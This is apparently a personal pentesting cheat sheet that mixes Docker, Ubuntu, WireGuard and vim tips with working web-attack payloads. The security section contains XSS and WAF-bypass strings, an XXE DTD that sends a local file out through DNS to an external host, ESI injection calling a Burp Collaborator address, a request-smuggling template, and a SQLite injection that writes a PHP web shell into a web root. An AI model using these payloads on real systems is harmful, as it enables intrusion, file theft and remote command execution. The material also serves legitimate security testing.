
# ahp_cheatsheet

### Contents
- [Burp Suite Professional](#burp-suite-professional)
- [Docker](#docker)
- [Ubuntu](#ubuntu)
- [Web Applications Security](#web-applications-security)
   + [XSS](#xss) 
   + [XXE](#xxe)
   + [ESI](#esi)
   + [Request Smuggling](#request-smuggling)
   + [Hackvertor](#hackvertor)
   + [SQL Injection](#sql-injection)
- [Network](#network)
- [/dev/null](#devnull)

## Burp Suite Professional
### Running own collaborator:  
`java -Xms10m -Xmx200m -XX:GCTimeRatio=19 -jar burp.jar --collaborator-server`

Non-standard ports:  
Configuration file: `--collaborator-config=myconfig.config`
 - https://portswigger.net/burp/documentation/collaborator/deploying#running-on-non-standard-ports
 - https://portswigger.net/burp/documentation/collaborator/deploying#collaborator-configuration-file-format

## Docker
### Run from _Dockerfile_ in directory:  
```docker build -t name .```  
### Remove all stopped containers  
```docker container prune```
### Remove dangling images
```docker image prune```  
### Stop and remove all containers
```
$ docker container stop $(docker container ls -aq)
$ docker container rm $(docker container ls -aq)
```

## Ubuntu
### Setup polish locales
Show locales:  
`locale -a`

Show default locales:  
`cat /etc/default/locale `

Install polish locale:  
`sudo locale-gen pl_PL.utf8`

Setup locales:  
`update-locale LANG=pl_PL.utf8`

### Add wireguard to systemd:  
```sh
# Add:  
sudo systemctl enable wg-quick@wg0.service
sudo systemctl daemon-reload
# Run:  
sudo systemctl start wg-quick@wg0
# Check status:
systemctl status wg-quick@wg0
```  

## Web Applications Security
### XSS
Some helpful payloads caught in the wild
```html
<svG x=1 onload=(co\u006efirm)``//
<embed src=//14.rs>
<marquee loop=1 width=0 onfinish=confirm(1)>
<marquee/onstart=alert(1)>
<esi:include src="http://abcdef.burpcollaborator.net/" /><script>alert(1)</script>
```

### XXE  
#### Exfiltrate in subdomain name:  
dtd file without .dtd extension _(test.html)_:  
```xml
<!ENTITY % file SYSTEM "file:///etc/flag">
<!ENTITY % eval "<!ENTITY &#x25; exfiltrate SYSTEM 'http://%file;.b0f4f2d1d89d4ec413ad.d.zhack.ca'>">
%eval;
%exfiltrate;
```  
Injection:
```xml
<!DOCTYPE foo [<!ENTITY % xxe SYSTEM "file:///tmp/test.html"> %xxe;]>
```  
http://dnsbin.zhack.ca/  
### ESI 
*Edge Side Include Injection*    
WAF'alike bypass:
```html
<svg<!--esi--> onload=aler<!--esi-->t<!--esi-->``
```
```html
he<!--esi-->llo -> hello 
but
he<!--esx-->llo isn't modified 
you have ESI injection
```
```xml
<esi:include src="/anypage.html" dca="none" />
```
XSS  
```
<esi:include src="http://abcdef.burpcollaborator.net/" /><script>alert(1)</script>
```
 - https://twitter.com/alxbrsn/status/981256374230319112
 - https://t.co/XRxIalWcng?amp=1 
 - https://t.co/vzRIo3RuaR?amp=1
 - https://www.slideshare.net/cisoplatform7/edge-side-include-injection-abusing-caching-servers-into-ssrf-and-transparent-session-hijacking
 
 ### Request Smuggling  
 TE.CL + Hackvertor  
 *(disable “Update Content-Length” in Repeater && “Auto Update Content Length” in Hackvertor Settings)*  
 ```
 POST / HTTP/1.1
Host: abc.com
Content-Type: application/x-www-form-urlencoded
Transfer-Encoding: chunked
Content-Length: 3

<@chunked_dec2hex_4><@get_var_3 /><@/chunked_dec2hex_4>
<@set_var_1><@length_2>GPOST / HTTP/1.1
Host: abc.com
Content-Length: 15

x=1<@/length_2><@/set_var_1>
0
```
 ### Hackvertor  
 JSON escape:
```xml
 <@python_4("import json;output = json.dumps(input)","7d808063a7c69f9dad4f4a3cb1c2bd1a")>test123'<>"<@/python_4>
 Result: "test123'<>\""
```
### SQL Injection
#### SQLite  
Connect:  
`$ sqlite3 test.db`
Command execution:  
```sql
ATTACH DATABASE '/var/www/html/y.php' AS y;--
CREATE TABLE y.p (dataz text);--
INSERT INTO y.p (dataz) VALUES ('<? system($_GET[''cmd'']);?>');--
```  
## Network  
### Lookup and display the route for a destination  
```
route get 192.168.13.14
```

## /dev/null
### nc permanent 'web-server'
```sh
while true; do 
  echo -e "HTTP/1.1 200 OK\n\n $(date)" | nc -l -p 1500 -q 1
done
```

### vim - nice colors for dark background
```
:set background=dark
```
permanently:
```
echo 'set background=dark' >> $HOME/.vimrc
```

### vim - show line numbers
```
:set number
```
